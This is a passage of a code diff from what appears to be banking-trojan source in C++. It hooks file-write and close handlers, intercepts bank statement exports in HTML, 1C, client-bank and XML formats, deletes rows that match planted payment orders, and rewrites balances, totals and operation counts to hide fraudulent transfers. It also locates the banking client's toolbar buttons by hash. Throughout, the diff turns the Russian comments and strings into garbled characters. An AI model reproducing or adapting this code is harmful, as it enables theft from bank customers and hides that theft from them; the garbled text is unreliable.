+				if( fileReports[i].type == ReportXml ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ xml пїЅпїЅпїЅпїЅ
 				{
-					if( fileReports[i].len > 80 ) //достаточно данных для идентификации
+					if( fileReports[i].len > 80 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 						if( m_strstr( fileReports[i].text, "<AccountStatements>" ) )
 							fileReports[i].type = ReportFormatXml;
 						else
 							saved = true;
 				}
-			if( saved ) //неопознаные форматы файлов оказались не нашими, поэтому сохраняем их как есть
+			if( saved ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			{
 				DWORD wr;
 				pHandlerWriteFile( hFile, fileReports[i].text, fileReports[i].len, &wr, 0 );
@@ -723,30 +734,30 @@ static void ChangeSumInfoOperaions( char* html, int addSum, int format )
 {
 	char* p = m_strstr( html, "<td" );
 	if( p == 0 ) return;
-	while( *p++ != '>' ); //пока не закончился тег
-	char* pp = p; //пробелы потом число
-	while( *p != '<' ) p++; //идем до </td>
+	while( *p++ != '>' ); //пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+	char* pp = p; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	while( *p != '<' ) p++; //пїЅпїЅпїЅпїЅ пїЅпїЅ </td>
 	*p = 0;
-	//извлекаем сумму
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
     int sum = BalansToInt( pp, format );
     sum += addSum;
     char sumText[32];
     IntToBalans( sum, sumText, format );
-    //ложим новую сумму
+    //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
     char* ps = sumText;
-    while( *ps != 0 ) ps++; //идем в конец числа
-    ps--; //на последней цифре суммы
-	*p-- = '<'; //восстанавливаем
-	while( ps >= sumText ) *p-- = *ps--; //заносим число с конца в начало
-	while( *p != '>' ) *p-- = ' ';  //заполняем пробелами пока не встретим начальный тег
+    while( *ps != 0 ) ps++; //пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+    ps--; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	*p-- = '<'; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	while( ps >= sumText ) *p-- = *ps--; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	while( *p != '>' ) *p-- = ' ';  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 }
 
 static void ModifyInfoOperaions( FileReport& fr )
 {
-	DBGRAFA( "RAFA", "Модификация отчета в html формате" );
+	DBGRAFA( "RAFA", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ html пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	for( int i = 0; i < c_paymentOrders; i++ )
 	{
-		//приводим сумму к виду как в файле (1,234.56)
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ (1,234.56)
 		int sumInt = BalansToInt( paymentOrders[i].sum, 0 );
 		char sumText[32];
 		IntToBalans( sumInt, sumText, 1 );
@@ -755,42 +766,42 @@ static void ModifyInfoOperaions( FileReport& fr )
 		while( state >= 0 )
 		{
 			int sz;
-			//находим строку таблицы
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			html = FindBetweenTag( html, "<tr>", "</tr>", sz );
 			if( html == 0 ) break;
-			char c = html[sz]; //ставим в конце строки 0, чтобы дальше не был поиск
+			char c = html[sz]; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 0, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			html[sz] = 0;
 			switch( state )
 			{
-				case 0: //поиск строки с платежкой
+				case 0: //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					{
-						//есть ли нужная сумма в строке
+						//пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 						char* p = m_strstr( html, sumText );
 						if( p )
 						{
-							//есть ли нужный счет в строке
+							//пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 							p = m_strstr( p, paymentOrders[i].recvAcc );
 							if( p )
 							{
-								//есть ли нужное назначение
+								//пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 								p = m_strstr( p, paymentOrders[i].comment );
 								if( p )
 								{
-									//найдена строка с платежкой, удаляем
+									//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 									int restLen = fr.len - (html - fr.text) - sz;
 									m_memcpy( html, html + sz, restLen );
 									fr.len -= sz;
 									html[restLen] = 0;
-									state = 1; //переходим на модификацию итоговых сумм
+									state = 1; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 									sz = 0;
 								}
 							}
 						}
 					}
 					break;
-				case 1: //поиск строки с итоговой суммой
+				case 1: //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 					{
-						char* p = m_strstr( html, "Сумма в валюте счета" );
+						char* p = m_strstr( html, "пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ" );
 						if( p )
 						{
 							ChangeSumInfoOperaions( p, -sumInt, 1 );
@@ -798,9 +809,9 @@ static void ModifyInfoOperaions( FileReport& fr )
 						}
 					}
 					break;
-				case 2: //поиск количества операций
+				case 2: //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					{
-						char* p = m_strstr( html, "Количество операций" );
+						char* p = m_strstr( html, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 						if( p )
 						{
 							ChangeSumInfoOperaions( p, -1, 2 );
@@ -808,9 +819,9 @@ static void ModifyInfoOperaions( FileReport& fr )
 						}
 				    }
 					break;
-				case 3: //поиск исходящего остатка
+				case 3: //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					{
-						char* p = m_strstr( html, "Исходящий остаток на конец дня" );
+						char* p = m_strstr( html, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ" );
 						if( p )
 						{
 							ChangeSumInfoOperaions( p, sumInt, 1 );
@@ -818,9 +829,9 @@ static void ModifyInfoOperaions( FileReport& fr )
 						}
 				    }
 					break;
-				case 4: //поиск входящего остатка
+				case 4: //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					{
-						char* p = m_strstr( html, "Входящий остаток на начало дня" );
+						char* p = m_strstr( html, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ" );
 						if( p )
 						{
 							ChangeSumInfoOperaions( p, sumInt, 1 );
@@ -829,22 +840,22 @@ static void ModifyInfoOperaions( FileReport& fr )
 				    }
 					break;
 			}
-			html[sz] = c; //восстанавливаем
+			html[sz] = c; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			html += sz;
 		}
 	}
 }
 
-//возвращает на сколько изменилась длина отчета, endVal - символ окончания числа
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, endVal - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 static int ChangeSumForVar( char* text, int lenText, const char* var, int addSum, int format, char endVal )
 {
 	char* p = m_strstr( text, var );
 	if( p == 0 ) return 0;
 	int len = m_lstrlen(var);
 	p += len;
-	//ищем начало числа
+	//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	while( *p < '0' || *p > '9' ) p++;
-	//ищем конец числа 
+	//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 
 	char* pp = p;
 	while( *p != endVal ) p++;
 	*p = 0;
@@ -855,20 +866,20 @@ static int ChangeSumForVar( char* text, int lenText, const char* var, int addSum
 	len = m_lstrlen(sumText);
 	int oldLen = p - pp;
 	int subLen = len - oldLen;
-	//если размер старой и новой суммы разные, то перемещаем отрезок справа
+	//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if( len != oldLen )
 	{
-		int movedLen = lenText - (p - text); //перемещаемая длина
-		if( len < oldLen ) //длина суммы стала меньше 
+		int movedLen = lenText - (p - text); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+		if( len < oldLen ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 
 			m_memcpy( p + subLen, p, movedLen );
-		else //длина суммы стала больше
+		else //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			char* p2 = text + lenText;
 			char* p3 = p2 + subLen;
 			while( p2 >= p ) *p3-- = *p2--;
 		}
 	}
-	//заменяем суммы
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	p = sumText;
 	while( *p ) *pp++ = *p++;
 	return subLen;
@@ -876,7 +887,7 @@ static int ChangeSumForVar( char* text, int lenText, const char* var, int addSum
 
 static void ModifyFormat1C( FileReport& fr )
 {
-	DBGRAFA( "RAFA", "Модификация отчета в 1C формате" );
+	DBGRAFA( "RAFA", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ 1C пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	for( int i = 0; i < c_paymentOrders; i++ )
 	{
 		int sumInt = BalansToInt( paymentOrders[i].sum, 0 );
@@ -887,33 +898,33 @@ static void ModifyFormat1C( FileReport& fr )
 		while( !stop )
 		{
 			int sz;
-			//находим секцию
-			html = FindBetweenTag( html, "СекцияДокумент", "КонецДокумента", sz );
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+			html = FindBetweenTag( html, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", sz );
 			if( html == 0 ) break;
-			sz += 2; //перевод строки \r\n
-			char c = html[sz]; //ставим в конце 0, чтобы дальше не был поиск
+			sz += 2; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ \r\n
+			char c = html[sz]; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ 0, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			html[sz] = 0;
-			//есть ли нужная сумма в секции
+			//пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			char* p = m_strstr( html, sumText );
 			if( p )
 			{
-				//есть ли нужный счет в секции
+				//пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				p = m_strstr( p, paymentOrders[i].recvAcc );
 				if( p )
 				{
-					//есть ли нужное назначение
+					//пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					p = m_strstr( p, paymentOrders[i].comment );
 					if( p )
 					{
-						//найдена секция с платежкой, удаляем
+						//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 						int restLen = fr.len - (html - fr.text) - sz;
 						m_memcpy( html, html + sz, restLen );
 						fr.len -= sz;
 						html[restLen] = 0;
 						int oldLen = fr.len;
-						//уменьшаем итоговую сумму и увеличиваем остаток
-						oldLen += ChangeSumForVar( fr.text, oldLen, "ВсегоСписано", -sumInt, 4, 'r' );
-						oldLen += ChangeSumForVar( fr.text, oldLen, "КонечныйОстаток", sumInt, 4, 'r' );
+						//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+						oldLen += ChangeSumForVar( fr.text, oldLen, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", -sumInt, 4, 'r' );
+						oldLen += ChangeSumForVar( fr.text, oldLen, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", sumInt, 4, 'r' );
 						sz = oldLen - fr.len;
 						fr.len = oldLen;
 						stop = true;
@@ -926,10 +937,10 @@ static void ModifyFormat1C( FileReport& fr )
 	}
 }
 
-//модификация экспорта для Клиент-Банка
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅ
 static void ModifyFormatKB( FileReport& fr )
 {
-	DBGRAFA( "RAFA", "Модификация отчета в формате клиент-банка" );
+	DBGRAFA( "RAFA", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ-пїЅпїЅпїЅпїЅпїЅ" );
 	for( int i = 0; i < c_paymentOrders; i++ )
 	{
 		int sumInt = BalansToInt( paymentOrders[i].sum, 0 );
@@ -940,28 +951,28 @@ static void ModifyFormatKB( FileReport& fr )
 		while( !stop )
 		{
 			int sz;
-			//находим секцию
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			html = FindBetweenTag( html, "OPERATION", "F312: ", sz );
 			if( html == 0 ) break;
-			sz += 2; //перевод строки \r\n
-			char c = html[sz]; //ставим в конце 0, чтобы дальше не был поиск
+			sz += 2; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ \r\n
+			char c = html[sz]; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ 0, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			html[sz] = 0;
-			//есть ли нужная сумма в секции
+			//пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			char* p = m_strstr( html, sumText );
 			if( p )
 			{
-				//есть ли нужный счет в секции
+				//пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				p = m_strstr( p, paymentOrders[i].recvAcc );
 				if( p )
 				{
-					//по назначению не проверяем, так как кодировка разная
-					//найдена секция с платежкой, удаляем
+					//пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					int restLen = fr.len - (html - fr.text) - sz;
 					m_memcpy( html, html + sz, restLen );
 					fr.len -= sz;
 					html[restLen] = 0;
 					int oldLen = fr.len;
-					//уменьшаем итоговую сумму
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 					static const char* flds1[] = { "F42:", "F29:", "F70:", "F71:", 0 };
 					const char** fld = flds1;
 					sumInt = 13449490;
@@ -971,7 +982,7 @@ static void ModifyFormatKB( FileReport& fr )
 						fld++;
 					}
 					
-					//увеличиваем остаток
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					static const char* flds2[] = { "F46:", "F52:", "F69:", 0 };
 					fld = flds2;
 					while( *fld ) 
@@ -980,7 +991,7 @@ static void ModifyFormatKB( FileReport& fr )
 						fld++;
 					}
 
-					//уменьшаем количество платежек
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					oldLen += ChangeSumForVar( fr.text, oldLen, "F44:", -1, 2, 'r' );
 
 					sz = oldLen - fr.len;
@@ -994,10 +1005,10 @@ static void ModifyFormatKB( FileReport& fr )
 	}
 }
 
-//модификация для формата xml
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ xml
 static void ModifyFormatXml( FileReport& fr )
 {
-	DBGRAFA( "RAFA", "Модификация отчета в xml формате" );
+	DBGRAFA( "RAFA", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ xml пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	for( int i = 0; i < c_paymentOrders; i++ )
 	{
 		int sumInt = BalansToInt( paymentOrders[i].sum, 0 );
@@ -1006,28 +1017,28 @@ static void ModifyFormatXml( FileReport& fr )
 		while( !stop )
 		{
 			int sz;
-			//находим секцию
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			text = FindBetweenTag( text, "<Statement>", "</Statement>", sz );
 			if( text == 0 ) break;
-			sz += 2; //перевод строки \r\n
-			char c = text[sz]; //ставим в конце 0, чтобы дальше не был поиск
+			sz += 2; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ \r\n
+			char c = text[sz]; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ 0, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			text[sz] = 0;
-			//есть ли нужная сумма в секции
+			//пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			char* p = m_strstr( text, paymentOrders[i].sum );
 			if( p )
 			{
-				//есть ли нужный счет в секции
+				//пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				p = m_strstr( p, paymentOrders[i].recvAcc );
 				if( p )
 				{
-					//найдена секция с платежкой, удаляем
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					int restLen = fr.len - (text - fr.text) - sz;
 					m_memcpy( text, text + sz, restLen );
 					fr.len -= sz;
 					text[restLen] = 0;
 					int oldLen = fr.len;
 
-					//уменьшаем итоговую сумму
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 					static const char* flds1[] = { "<DebitOverturn", "<DebitOverturnCover>", "<DebitOverturnDealing>", "<DebitOverturnDealingCover>", 0 };
 					const char** fld = flds1;
 					while( *fld ) 
@@ -1036,7 +1047,7 @@ static void ModifyFormatXml( FileReport& fr )
 						fld++;
 					}
 					
-					//увеличиваем остаток
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					static const char* flds2[] = { "<OpenRemainder>", "<OutRemainder>", "<OutRemainderWithDealing>", 0 };
 					fld = flds2;
 					while( *fld ) 
@@ -1045,7 +1056,7 @@ static void ModifyFormatXml( FileReport& fr )
 						fld++;
 					}
 
-					//уменьшаем количество платежек
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					oldLen += ChangeSumForVar( fr.text, oldLen, "<DebitOverturnCount>", -1, 2, '<' );
 
 					sz = oldLen - fr.len;
@@ -1061,11 +1072,11 @@ static void ModifyFormatXml( FileReport& fr )
 
 static BOOL WINAPI HandlerCloseHandle(HANDLE hObject)
 {
-	const char* nameReport = 0; //имя формируемого отчета для лога
+	const char* nameReport = 0; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	for( int i = 0; i < maxFileReports; i++ )
-		if( fileReports[i].file == hObject ) //наш отчет
+		if( fileReports[i].file == hObject ) //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		{
-			//поправляем его
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 			switch( fileReports[i].type )
 			{
 				case ReportInfoOperaions:	 ModifyInfoOperaions(fileReports[i]); nameReport = "report_html"; break;
@@ -1073,7 +1084,7 @@ static BOOL WINAPI HandlerCloseHandle(HANDLE hObject)
 				case ReportFormat1C:		 ModifyFormat1C(fileReports[i]); nameReport = "export_to_1C"; break;
 				case ReportFormatXml:		 ModifyFormatXml(fileReports[i]); nameReport = "export_to_xml"; break;
 			}
-			//пишем в файл
+			//пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 			DWORD wr;
 			pHandlerWriteFile( hObject, fileReports[i].text, fileReports[i].len, &wr, 0 );
 			MemFree(fileReports[i].text);
@@ -1110,7 +1121,7 @@ static BOOL CALLBACK EnumTreeList( HWND wnd, LPARAM lParam )
 				char text[128];
 				pSendMessageA( wnd, TB_GETBUTTONTEXT, (WPARAM)bt.idCommand, (LPARAM)text );
 				DWORD hash = CalcHash(text);
-				if( hash == 0x8CBC9350 /* Новый документ */ )
+				if( hash == 0x8CBC9350 /* пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ */ )
 				{
 					toolBar = wnd;
 					idBtNewDoc = bt.idCommand;
@@ -1121,11 +1132,11 @@ static BOOL CALLBACK EnumTreeList( HWND wnd, LPARAM lParam )
 					posBtNewDoc.y = r.top;
 					DBGRAFA( "Rafa", "Found button x,y (%d,%d)", posBtNewDoc.x, posBtNewDoc.y );
 				}
-				if( hash == 0xD3910EEF /* Доставка */ /*&& bt.idCommand == 111*/ )
+				if( hash == 0xD3910EEF /* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ */ /*&& bt.idCommand == 111*/ )
 				{
 					RECT r;
 					pSendMessageA( wnd, TB_GETRECT, (WPARAM)bt.idCommand, (LPARAM)&r );
-					//есть две кнопки Доставка, но одна шириною 2, поэтому ее игнорируем
